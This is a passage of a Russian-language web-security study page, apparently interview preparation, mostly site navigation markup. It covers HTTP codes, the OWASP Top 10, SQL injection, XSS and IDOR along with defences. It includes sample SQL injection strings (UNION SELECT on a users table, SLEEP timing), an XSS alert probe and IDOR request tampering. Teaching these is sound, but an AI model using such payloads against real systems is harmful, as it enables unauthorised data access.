1.56.35.33.8.5 1.25.5s.9-.17 1.25-.5c.67-.7.67-1.8 0-2.5-.35-.33-.8-.5-1.25-.5-.1 0-.2 0-.31.03l-2.34-2.34c.49-.65.87-1.39 1.11-2.19h1.11A1.746 1.746 0 0 0 23 13a1.746 1.746 0 0 0-3.18-1H19c0-1.57-.5-3-1.4-4.19l1.34-1.34c.11.03.21.03.31.03.45 0 .9-.17 1.25-.5.67-.69.67-1.8 0-2.5-.35-.33-.8-.5-1.25-.5s-.9.17-1.25.5c-.41.43-.57 1-.47 1.56L16.19 6.4c-.92-.69-2-1.15-3.19-1.32v-1.4A1.746 1.746 0 0 0 12 .5M12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5m-1.5-8C9.67 9 9 9.67 9 10.5s.67 1.5 1.5 1.5 1.5-.67 1.5-1.5S11.33 9 10.5 9m3.5 4c-.55 0-1 .45-1 1s.45 1 1 1 1-.45 1-1-.45-1-1-1"/></svg>
+  
+  <span class="md-ellipsis">
+    Анализ вредоносного ПО
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../analyse_siem/" class="md-nav__link">
+        
+  
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 3H5c-1.11 0-2 .89-2 2v4h2V5h14v14H5v-4H3v4a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V5a2 2 0 0 0-2-2m-8.92 12.58L11.5 17l5-5-5-5-1.42 1.41L12.67 11H3v2h9.67z"/></svg>
+  
+  <span class="md-ellipsis">
+    Анализ логов SIEM
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 1h16a1 1 0 0 1 1 1v4a1 1 0 0 1-1 1H3a1 1 0 0 1-1-1V2a1 1 0 0 1 1-1m0 8h16a1 1 0 0 1 1 1v.67l-2.5-1.11-6.5 2.88V15H3a1 1 0 0 1-1-1v-4a1 1 0 0 1 1-1m0 8h8c.06 2.25 1 4.4 2.46 6H3a1 1 0 0 1-1-1v-4a1 1 0 0 1 1-1M8 5h1V3H8zm0 8h1v-2H8zm0 8h1v-2H8zM4 3v2h2V3zm0 8v2h2v-2zm0 8v2h2v-2zm13.5-7 4.5 2v3c0 2.78-1.92 5.37-4.5 6-2.58-.63-4.5-3.22-4.5-6v-3zm0 1.94L15 15.06v2.66c0 1.54 1.07 2.98 2.5 3.34z"/></svg>
+  
+  <span class="md-ellipsis">
+    Веб безопасность
+    
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 1h16a1 1 0 0 1 1 1v4a1 1 0 0 1-1 1H3a1 1 0 0 1-1-1V2a1 1 0 0 1 1-1m0 8h16a1 1 0 0 1 1 1v.67l-2.5-1.11-6.5 2.88V15H3a1 1 0 0 1-1-1v-4a1 1 0 0 1 1-1m0 8h8c.06 2.25 1 4.4 2.46 6H3a1 1 0 0 1-1-1v-4a1 1 0 0 1 1-1M8 5h1V3H8zm0 8h1v-2H8zm0 8h1v-2H8zM4 3v2h2V3zm0 8v2h2v-2zm0 8v2h2v-2zm13.5-7 4.5 2v3c0 2.78-1.92 5.37-4.5 6-2.58-.63-4.5-3.22-4.5-6v-3zm0 1.94L15 15.06v2.66c0 1.54 1.07 2.98 2.5 3.34z"/></svg>
+  
+  <span class="md-ellipsis">
+    Веб безопасность
+    
+  </span>
+  
+
+      </a>
+      
+        
+
+  
+
+<nav class="md-nav md-nav--secondary" aria-label="Содержание">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Содержание
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#1-http" class="md-nav__link">
+    <span class="md-ellipsis">
+      🔹 1. HTTP коды ответов.
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#2-10-owasp" class="md-nav__link">
+    <span class="md-ellipsis">
+      🔹 2. Топ 10 OWASP.
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3-sql" class="md-nav__link">
+    <span class="md-ellipsis">
+      🔹 3. Что такое SQL инъекция?
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#4-xss-" class="md-nav__link">
+    <span class="md-ellipsis">
+      🔹 4. Что такое XSS - типы и как защититься.
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#5-idor" class="md-nav__link">
+    <span class="md-ellipsis">
+      🔹 5. Что такое IDOR?
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#idor" class="md-nav__link">
+    <span class="md-ellipsis">
+      Как защититься от IDOR?
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#6-rfi-remote-file-inclusion" class="md-nav__link">
+    <span class="md-ellipsis">
+      🔹 6. Что такое RFI (Remote File Inclusion) и как защититься.
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#7-lfi-local-file-inclusion" class="md-nav__link">
+    <span class="md-ellipsis">
+      🔹 7. Что такое LFI (Local File Inclusion) и как защититься.
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#8-csrf" class="md-nav__link">
+    <span class="md-ellipsis">
+      🔹 8. Что такое CSRF.
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#9-waf" class="md-nav__link">
+    <span class="md-ellipsis">
+      🔹 9. Что такое WAF.
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#10-directory-traversal" class="md-nav__link">
+    <span class="md-ellipsis">
+      🔹 10. Как ты будешь детектировать попытку атаки обхода директории (directory traversal).
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../obshie/" class="md-nav__link">
+        
+  
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 3C9.23 3 6.19 5.95 6 9.66l-1.92 2.53c-.24.31 0 .81.42.81H6v3c0 1.11.89 2 2 2h1v3h7v-4.69c2.37-1.12 4-3.51 4-6.31 0-3.86-3.12-7-7-7m1 11h-2v-2h2zm1.75-5.19c-.29.4-.66.69-1.11.93-.25.16-.42.33-.51.52-.09.18-.13.43-.13.74h-2c0-.5.11-.92.31-1.18.19-.27.54-.57 1.05-.91.26-.16.47-.36.61-.59.16-.23.23-.5.23-.82 0-.3-.08-.56-.26-.75-.18-.18-.44-.28-.75-.28a1 1 0 0 0-.66.23c-.18.16-.27.39-.28.69h-1.93l-.01-.03c-.01-.79.25-1.36.77-1.77.54-.39 1.24-.59 2.11-.59.93 0 1.66.23 2.19.68.54.45.81 1.06.81 1.82 0 .5-.15.91-.44 1.31"/></svg>
+  
+  <span class="md-ellipsis">
+    Общие вопросы
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../polity_sec/" class="md-nav__link">
+        
+  
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M71 12.5c-8.6 1-15 8.2-15 16.8 0 9.3 7.5 16.8 16.7 16.9h111.4c8.8-.1 15.9-7.2 15.9-16V16c0-9.5-8.3-17-17.8-15.9zm118.5 65.6H66.6C64.9 83.8 64 89.8 64 96c0 35.3 28.7 64 64 64s64-28.7 64-64c0-6.2-.9-12.2-2.5-17.9M32 256v32c0 17.7 14.3 32 32 32h128c1.8 0 3.5-.1 5.2-.4L53 208.6c-12.9 11.7-21 28.6-21 47.4m190.2 42.5c1.1-3.3 1.8-6.8 1.8-10.5v-32c0-35.3-28.7-64-64-64H96c-3.7 0-7.4.3-10.9.9zM384 160a64 64 0 1 0 0-128 64 64 0 1 0 0 128m-32 32c-35.3 0-64 28.7-64 64v32c0 17.7 14.3 32 32 32h128c17.7 0 32-14.3 32-32v-32c0-35.3-28.7-64-64-64zM215.8 450.1c5.2-4.6 8.2-11.1 8.2-18.1s-3-13.5-8.2-18.1l-64-56c-7.1-6.2-17.1-7.7-25.7-3.8S112 366.6 112 376v32H24c-13.3 0-24 10.7-24 24s10.7 24 24 24h88v32c0 9.4 5.5 18 14.1 21.9s18.6 2.4 25.7-3.8zm72.2-18.2c0 6.9 2.9 13.5 8.1 18.1l64 56.4c7.1 6.2 17.1 7.8 25.7 3.9s14.1-12.4 14.1-21.9V456h88c13.3 0 24-10.7 24-24s-10.7-24-24-24h-88v-32c0-9.4-5.5-18-14.1-21.9s-18.6-2.4-25.7 3.8l-64 56c-5.2 4.5-8.2 11.1-8.2 18z"/></svg>
+  
+  <span class="md-ellipsis">
+    Политика безопасности
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../pravo/" class="md-nav__link">
+        
+  
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 4.21c1.24.51 2.65.79 4 .79 1.05 0 2.1-.16 3.08-.46C18.5 5.5 18 6.71 18 8c0 1.32.54 2.93 1.1 4.63.4 1.2.9 2.7.9 3.37 0 1.03-3.53 3-8 3.96C7.54 19 4 17.03 4 16c0-.67.5-2.17.9-3.37C5.46 10.93 6 9.32 6 8c0-1.29-.5-2.5-1.08-3.46C5.9 4.84 6.96 5 8 5c1.35 0 2.76-.28 4-.79M20 2c-1.15.64-2.6 1-4 1s-2.86-.37-4-1c-1.14.63-2.6 1-4 1s-2.85-.36-4-1L2 4s2 2 2 4-2 6-2 8c0 4 10 6 10 6s10-2 10-6c0-2-2-6-2-8s2-4 2-4zm-4.95 14.45-3.08-1.86-3.07 1.86.82-3.5L7 10.61l3.58-.31L11.97 7l1.4 3.29 3.58.31-2.72 2.34z"/></svg>
+  
+  <span class="md-ellipsis">
+    Правовые вопросы
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../net_sec/" class="md-nav__link">
+        
+  
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M16.36 14c.08-.66.14-1.32.14-2s-.06-1.34-.14-2h3.38c.16.64.26 1.31.26 2s-.1 1.36-.26 2m-5.15 5.56c.6-1.11 1.06-2.31 1.38-3.56h2.95a8.03 8.03 0 0 1-4.33 3.56M14.34 14H9.66c-.1-.66-.16-1.32-.16-2s.06-1.35.16-2h4.68c.09.65.16 1.32.16 2s-.07 1.34-.16 2M12 19.96c-.83-1.2-1.5-2.53-1.91-3.96h3.82c-.41 1.43-1.08 2.76-1.91 3.96M8 8H5.08A7.92 7.92 0 0 1 9.4 4.44C8.8 5.55 8.35 6.75 8 8m-2.92 8H8c.35 1.25.8 2.45 1.4 3.56A8 8 0 0 1 5.08 16m-.82-2C4.1 13.36 4 12.69 4 12s.1-1.36.26-2h3.38c-.08.66-.14 1.32-.14 2s.06 1.34.14 2M12 4.03c.83 1.2 1.5 2.54 1.91 3.97h-3.82c.41-1.43 1.08-2.77 1.91-3.97M18.92 8h-2.95a15.7 15.7 0 0 0-1.38-3.56c1.84.63 3.37 1.9 4.33 3.56M12 2C6.47 2 2 6.5 2 12a10 10 0 0 0 10 10 10 10 0 0 0 10-10A10 10 0 0 0 12 2"/></svg>
+  
+  <span class="md-ellipsis">
+    Сетевая безопасность
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../study_res/res/" class="md-nav__link">
+        
+  
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 21.5c-1.35-.85-3.8-1.5-5.5-1.5-1.65 0-3.35.3-4.75 1.05-.1.05-.15.05-.25.05-.25 0-.5-.25-.5-.5V6c.6-.45 1.25-.75 2-1 1.11-.35 2.33-.5 3.5-.5 1.95 0 4.05.4 5.5 1.5 1.45-1.1 3.55-1.5 5.5-1.5 1.17 0 2.39.15 3.5.5.75.25 1.4.55 2 1v14.6c0 .25-.25.5-.5.5-.1 0-.15 0-.25-.05-1.4-.75-3.1-1.05-4.75-1.05-1.7 0-4.15.65-5.5 1.5M12 8v11.5c1.35-.85 3.8-1.5 5.5-1.5 1.2 0 2.4.15 3.5.5V7c-1.1-.35-2.3-.5-3.5-.5-1.7 0-4.15.65-5.5 1.5m1 3.5c1.11-.68 2.6-1 4.5-1 .91 0 1.76.09 2.5.28V9.23c-.87-.15-1.71-.23-2.5-.23q-2.655 0-4.5.84zm4.5.17c-1.71 0-3.21.26-4.5.79v1.69c1.11-.65 2.6-.99 4.5-.99 1.04 0 1.88.08 2.5.24v-1.5c-.87-.16-1.71-.23-2.5-.23m2.5 2.9c-.87-.16-1.71-.24-2.5-.24-1.83 0-3.33.27-4.5.8v1.69c1.11-.66 2.6-.99 4.5-.99 1.04 0 1.88.08 2.5.24z"/></svg>
+  
+  <span class="md-ellipsis">
+    Образовательные ресурсы
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+  
+
+<nav class="md-nav md-nav--secondary" aria-label="Содержание">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Содержание
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#1-http" class="md-nav__link">
+    <span class="md-ellipsis">
+      🔹 1. HTTP коды ответов.
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#2-10-owasp" class="md-nav__link">
+    <span class="md-ellipsis">
+      🔹 2. Топ 10 OWASP.
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3-sql" class="md-nav__link">
+    <span class="md-ellipsis">
+      🔹 3. Что такое SQL инъекция?
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#4-xss-" class="md-nav__link">
+    <span class="md-ellipsis">
+      🔹 4. Что такое XSS - типы и как защититься.
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#5-idor" class="md-nav__link">
+    <span class="md-ellipsis">
+      🔹 5. Что такое IDOR?
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#idor" class="md-nav__link">
+    <span class="md-ellipsis">
+      Как защититься от IDOR?
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#6-rfi-remote-file-inclusion" class="md-nav__link">
+    <span class="md-ellipsis">
+      🔹 6. Что такое RFI (Remote File Inclusion) и как защититься.
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#7-lfi-local-file-inclusion" class="md-nav__link">
+    <span class="md-ellipsis">
+      🔹 7. Что такое LFI (Local File Inclusion) и как защититься.
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#8-csrf" class="md-nav__link">
+    <span class="md-ellipsis">
+      🔹 8. Что такое CSRF.
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#9-waf" class="md-nav__link">
+    <span class="md-ellipsis">
+      🔹 9. Что такое WAF.
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#10-directory-traversal" class="md-nav__link">
+    <span class="md-ellipsis">
+      🔹 10. Как ты будешь детектировать попытку атаки обхода директории (directory traversal).
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+  <h1>Веб безопасность</h1>
+
+<h2 id="1-http">🔹 1. HTTP коды ответов.</h2>
+<blockquote>
+<p>HTTP-коды ответов (HTTP response codes) — это трехзначные числа, которые сервер отправляет в ответ на запрос клиента (например, браузера) для информирования о результате обработки запроса. Они разделены на пять классов, каждый из которых обозначает определенный тип ответа. Вот основные категории:</p>
+</blockquote>
+<p>📌1.<strong>1xx: Информационные (Informational)</strong>  </p>
+<p>Эти коды указывают, что запрос получен и обработка продолжается.  </p>
+<p>Примеры:</p>
+<ul>
+<li>
+<p><strong>100 Continue</strong> — сервер готов принять оставшуюся часть запроса.</p>
+</li>
+<li>
+<p><strong>101 Switching Protocols</strong> — сервер согласен сменить протокол (например, с HTTP на WebSocket).</p>
+</li>
+</ul>
+<p>📌2.<strong>2xx: Успешные (Success)</strong>  </p>
+<p>Эти коды означают, что запрос был успешно обработан.  </p>
+<p>Примеры:</p>
+<ul>
+<li>
+<p><strong>200 OK</strong> — запрос выполнен успешно.</p>
+</li>
+<li>
+<p><strong>201 Created</strong> — новый ресурс успешно создан.</p>
+</li>
+<li>
+<p><strong>204 No Content</strong> — запрос выполнен, но ответ не содержит данных.</p>
+</li>
+</ul>
+<p>📌3.<strong>3xx: Перенаправления (Redirection)</strong> </p>
+<p>Эти коды указывают, что для завершения запроса требуется дополнительное действие, например, перенаправление на другой URL.  </p>
+<p>Примеры:</p>
+<ul>
+<li>
+<p><strong>301 Moved Permanently</strong> — ресурс permanently перемещен на новый URL.</p>
+</li>
+<li>
+<p><strong>302 Found</strong> — ресурс временно доступен по другому URL.</p>
+</li>
+<li>
+<p><strong>304 Not Modified</strong> — ресурс не изменился, можно использовать кэшированную версию.</p>
+</li>
+</ul>
+<p>📌4.<strong>4xx: Ошибки клиента (Client Errors)</strong>  </p>
+<p>Эти коды указывают на ошибки со стороны клиента, например, неверный запрос или отсутствие доступа.  </p>
+<p>Примеры:</p>
+<ul>
+<li>
+<p><strong>400 Bad Request</strong> — сервер не может обработать запрос из-за синтаксической ошибки.</p>
+</li>
+<li>
+<p><strong>401 Unauthorized</strong> — требуется аутентификация.</p>
+</li>
+<li>
+<p><strong>403 Forbidden</strong> — доступ к ресурсу запрещен.</p>
+</li>
+<li>
+<p><strong>404 Not Found</strong> — запрашиваемый ресурс не найден.</p>
+</li>
+</ul>
+<p>📌5.<strong>5xx: Ошибки сервера (Server Errors)</strong>  </p>
+<p>Эти коды указывают на ошибки на стороне сервера, которые препятствуют выполнению запроса.  </p>
+<p>Примеры:</p>
+<ul>
+<li>
+<p><strong>500 Internal Server Error</strong> — общая ошибка сервера.</p>
+</li>
+<li>
+<p><strong>502 Bad Gateway</strong> — сервер получил недопустимый ответ от вышестоящего сервера.</p>
+</li>
+<li>
+<p><strong>503 Service Unavailable</strong> — сервер временно недоступен (например, из-за перегрузки).</p>
+</li>
+</ul>
+<h2 id="2-10-owasp">🔹 2. Топ 10 OWASP.</h2>
+<p><strong>OWASP Top 10</strong> — это список наиболее критичных уязвимостей веб-приложений, составленный проектом <a href="https://owasp.org/">OWASP (Open Web Application Security Project)</a>. Этот список обновляется примерно раз в 3-4 года и помогает разработчикам и специалистам по безопасности понять главные угрозы и методы защиты от них.</p>
+<p><strong>Актуальный OWASP Top 10 (2021):</strong></p>
+<ol>
+<li>
+<p><strong>Broken Access Control (Нарушение управления доступом)</strong><br />
+    — Ошибки в механизмах аутентификации и авторизации, позволяющие злоумышленнику получить несанкционированный доступ к данным или функциям.<br />
+    📌 <em>Пример</em>: Пользователь может получить административные права, просто изменив идентификатор в URL.</p>
+</li>
+<li>
+<p><strong>Cryptographic Failures (Криптографические ошибки)</strong><br />
+    — Неправильное использование шифрования, утечка конфиденциальных данных, слабые алгоритмы или отсутствие шифрования.<br />
+    📌 <em>Пример</em>: Хранение паролей в открытом виде в базе данных.</p>
+</li>
+<li>
+<p><strong>Injection (Инъекции)</strong><br />
+    — Внедрение вредоносного кода в запросы (SQL, NoSQL, OS-команды, LDAP и т. д.).<br />
+    📌 <em>Пример</em>: SQL-инъекция через ввод <code>OR '1'='1'</code> в поле пароля.</p>
+</li>
+<li>
+<p><strong>Insecure Design (Небезопасный дизайн)</strong><br />
+    — Архитектурные ошибки, связанные с отсутствием моделей угроз и продуманной стратегии защиты.<br />
+    📌 <em>Пример</em>: Разработка API без ограничения количества запросов, что делает его уязвимым для DDoS.</p>
+</li>
+<li>
+<p><strong>Security Misconfiguration (Ошибки конфигурации безопасности)</strong><br />
+    — Использование стандартных паролей, лишних сервисов или небезопасных настроек.<br />
+    📌 <em>Пример</em>: Включённый режим отладки в продакшене, открытые файлы конфигурации.</p>
+</li>
+<li>
+<p><strong>Vulnerable and Outdated Components (Уязвимые и устаревшие компоненты)</strong><br />
+    — Использование библиотек, зависимостей или плагинов с известными уязвимостями.<br />
+    📌 <em>Пример</em>: Приложение использует старую версию Log4j с критической уязвимостью.</p>
+</li>
+<li>
+<p><strong>Identification and Authentication Failures (Ошибки идентификации и аутентификации)</strong><br />
+    — Слабые пароли, отсутствие многофакторной аутентификации (MFA), незащищённые токены.<br />
+    📌 <em>Пример</em>: Отсутствие защиты от brute-force атак на форму входа.</p>
+</li>
+<li>
+<p><strong>Software and Data Integrity Failures (Ошибки целостности ПО и данных)</strong><br />
+    — Недостаточные проверки целостности обновлений, зависимостей и файлов.<br />
+    📌 <em>Пример</em>: Загрузка обновлений по HTTP вместо HTTPS, что позволяет злоумышленникам их подменить.</p>
+</li>
+<li>
+<p><strong>Security Logging and Monitoring Failures (Отсутствие логирования и мониторинга безопасности)</strong><br />
+    — Недостаток журналирования событий, что мешает обнаружению атак.<br />
+    📌 <em>Пример</em>: Отсутствие логов неудачных попыток входа в систему.</p>
+</li>
+<li>
+<p><strong>Server-Side Request Forgery (SSRF) (Подделка серверных запросов)</strong><br />
+    — Возможность заставить сервер выполнить запрос к произвольному ресурсу.<br />
+    📌 <em>Пример</em>: Атака через загрузку изображения, где сервер скачивает вредоносный файл с внутреннего ресурса.</p>
+</li>
+</ol>
+<h2 id="3-sql">🔹 3. Что такое SQL инъекция?</h2>
+<blockquote>
+<p><strong>SQL-инъекция (SQL Injection, SQLi)</strong> — это уязвимость веб-приложений, возникающая при некорректной обработке пользовательских данных в SQL-запросах. Она позволяет злоумышленнику выполнять произвольные SQL-команды, получая доступ к базе данных, изменяя или даже удаляя данные.</p>
+</blockquote>
+<p><strong>Типы SQL-инъекций:</strong>
+1. <strong>Классическая (Union-based)</strong><br />
+    — Использует оператор <code>UNION</code> для объединения результатов нескольких запросов.<br />
+    🔹 <em>Пример</em>: <code>user' UNION SELECT name, password FROM users --</code>
+2. <strong>Слепая (Blind SQLi)</strong><br />
+    — Злоумышленник не видит прямого ответа, но может анализировать поведение системы.<br />
+    🔹 <em>Пример</em>:
+    - <code>user' AND 1=1 --</code> (вернёт данные)
+    - <code>user' AND 1=2 --</code> (не вернёт ничего)
+3. <strong>Временная (Time-based Blind)</strong><br />
+    — Использует задержку выполнения запроса для получения информации.<br />
+    🔹 <em>Пример</em>: <code>user' OR IF(1=1, SLEEP(5), 0) --</code>
+4. <strong>Out-of-band (OOB)</strong><br />
+    — Отправляет данные злоумышленнику через DNS или HTTP-запрос.</p>
+<p><strong>Как защититься от SQL-инъекций?</strong></p>
+<p>📌<strong>Использовать подготовленные (параметризованные) запросы:</strong></p>
+<p>📌<strong>Применять ORM (например, SQLAlchemy), который предотвращает инъекции.</strong>  </p>
+<p>📌<strong>Ограничивать права доступа к базе данных.</strong>  </p>
+<p>📌<strong>Фильтровать вводимые пользователем данные.</strong>  </p>
+<p>📌<strong>Использовать Web Application Firewall (WAF).</strong></p>
+<h2 id="4-xss-">🔹 4. Что такое XSS - типы и как защититься.</h2>
+<blockquote>
+<p><strong>XSS (межсайтовый скриптинг)</strong> — это уязвимость веб-приложений, при которой злоумышленник внедряет вредоносный скрипт (обычно JavaScript) в веб-страницу, которая затем выполняется у других пользователей. </p>
+</blockquote>
+<p>Это позволяет:
+- <strong>Красть cookies и сессии</strong> (что может привести к угону аккаунтов).
+- <strong>Перенаправлять жертву на фишинговые сайты</strong>.
+- <strong>Подменять содержимое страницы</strong> (например, подделывать формы входа).
+- <strong>Выполнять действия от имени пользователя</strong>.</p>
+<p><strong>Типы XSS:</strong></p>
+<p><strong>1. Reflected XSS (Отражённый XSS)</strong></p>
+<ul>
+<li>Скрипт передаётся через URL и выполняется в браузере жертвы.</li>
+<li>Обычно применяется через GET-параметры (<code>?query=&lt;script&gt;alert('XSS')&lt;/script&gt;</code>).</li>
+<li>
+<p>Атака требует, чтобы жертва перешла по вредоносной ссылке.
+<strong>2. Stored XSS (Хранимый XSS)</strong></p>
+</li>
+<li>
+<p>Вредоносный скрипт сохраняется в базе данных или файлах.</p>
+</li>
+<li>Выполняется автоматически при загрузке страницы.</li>
+<li>Более опасен, так как атакует всех пользователей сайта.</li>
+</ul>
+<p><strong>3. DOM-based XSS: Как она работает?</strong></p>
+<p><strong>DOM-based XSS</strong> — это вид межсайтового скриптинга (XSS), который происходит на стороне клиента (в браузере) и не затрагивает сервер. В отличие от <strong>Reflected XSS</strong> и <strong>Stored XSS</strong>, атака не передаёт вредоносный код на сервер — он выполняется прямо в браузере пользователя из-за небезопасной обработки DOM (Document Object Model).</p>
+<p>🔹 Предотвращение XSS</p>
+<p><strong>1. Экранирование (escaping) входных данных</strong></p>
+<p>Использовать безопасные функции для вывода в HTML, PHP, JavaScript</p>
+<p><strong>2. Фильтрация пользовательского ввода</strong></p>
+<p>Очищать текст от <code>&lt;script&gt;</code> и других опасных тегов.</p>
+<p>Использовать специальные библиотеки:</p>
+<ul>
+<li>
+<p><strong>PHP</strong>: HTML Purifier</p>
+</li>
+<li>
+<p><strong>Python</strong>: Bleach</p>
+</li>
+<li>
+<p><strong>Node.js</strong>: DOMPurify</p>
+</li>
+</ul>
+<p><strong>3. Использование Content Security Policy (CSP)</strong></p>
+<p><strong>Content Security Policy (CSP)</strong> — это механизм защиты веб-приложений от атак, таких как <strong>XSS (Cross-Site Scripting)</strong> и <strong>code injection</strong>. Он работает через специальные HTTP-заголовки, которые определяют, какие ресурсы можно загружать и выполнять на сайте.</p>
+<p>Как работает CSP?</p>
+<p>Когда браузер загружает страницу, он выполняет следующие шаги:</p>
+<p>1) <strong>Загружает HTML-код</strong> с сервера.  </p>
+<p>2) <strong>Ищет заголовок CSP</strong> (<code>Content-Security-Policy</code>) в HTTP-ответе.  </p>
+<p>3) <strong>Разбирает и кэширует политики CSP</strong> (список разрешённых источников для скриптов, стилей, изображений и т. д.).  </p>
+<p>4) <strong>Сравнивает каждый загружаемый ресурс</strong> с CSP-политиками.</p>
+<p>📌Если ресурс разрешён — он загружается.</p>
+<p>📌Если запрещён — браузер блокирует его и выводит ошибку в консоли.</p>
+<h2 id="5-idor">🔹 5. Что такое IDOR?</h2>
+<blockquote>
+<p><strong>IDOR (Несанкционированный прямой доступ к объектам)</strong> – это уязвимость, которая позволяет злоумышленнику получить доступ к данным других пользователей, изменяя параметры запроса.</p>
+</blockquote>
+<p>Как работает IDOR?</p>
+<blockquote>
+<p>По сути - это подмена данных в URL, POST запросах, API запросах и тд.</p>
+</blockquote>
+<p>Например:</p>
+<p><strong>📌 1. Подмена параметров в POST-запросе</strong></p>
+<p>Форма смены пароля:</p>
+<p><code>POST /change-password</code></p>
+<p><code>Content-Type: application/json</code></p>
+<p><code>{   "user_id": "123",   "new_password": "password123" }</code></p>
+<p>Если злоумышленник изменит <code>user_id</code> на <code>124</code>, он сможет сменить пароль чужого пользователя</p>
+<p><strong>📌 2. API-запрос без проверки прав</strong></p>
+<p>Многие веб-приложения используют API. Если в API нет авторизации, IDOR становится серьёзной проблемой.</p>
+<p>Уязвимый API-запрос:</p>
+<p><code>GET /api/user/10</code></p>
+<p>Если злоумышленник меняет <code>10</code> на <code>11</code>, он может получить чужие данные</p>
+<p><strong>📌 3. Изменение ID в URL</strong></p>
+<p>Допустим, на сайте используются ссылки:</p>
+<p><code>https://example.com/orders/1001</code></p>
+<p>Если злоумышленник подставит другой номер заказа</p>
+<h2 id="idor"><strong>Как защититься от IDOR?</strong></h2>
+<p>✅ <strong>1. Проверять права доступа</strong> - Перед тем как отдавать данные пользователю, убедитесь, что <strong>он имеет на них права</strong>.</p>
+<p>✅ <strong>2. Использовать аутентификацию и авторизацию</strong> - В API-запросах проверять, что пользователь запрашивает <strong>только свои данные</strong>.</p>
+<p>✅ <strong>3. Избегать передавать идентификаторы в URL</strong> - Вместо <code>id=123</code> лучше использовать <strong>уникальные токены</strong> или <strong>JWT-токены</strong>.</p>
